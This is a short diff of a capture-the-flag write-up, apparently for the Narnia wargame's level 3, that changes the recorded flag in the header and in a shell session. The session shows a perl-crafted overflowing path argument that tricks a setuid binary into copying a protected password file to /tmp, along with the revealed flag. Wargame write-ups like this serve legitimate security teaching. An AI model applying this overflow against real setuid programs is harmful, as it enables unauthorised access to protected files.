@@ -5,7 +5,7 @@
 **Completion Date & Time :** 2026 - 02 - 11 / 15:08
 
 ---
-## FLAG : iqNWNk173q
+## FLAG : `CyWyf6uGWQ`
 
 ---
 ## Solution :
@@ -118,7 +118,7 @@ Here is the result :
 narnia3@narnia:/narnia$ /narnia/narnia3 $(perl -e 'print "/tmp/" . "A"x27 . "/tmp/owenlink"')
 copied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/owenlink to a safer place... (/tmp/owenlink)
 narnia3@narnia:/narnia$ cat /tmp/owenlink
-iqNWNk173q
+CyWyf6uGWQ
 ```
 
 ---
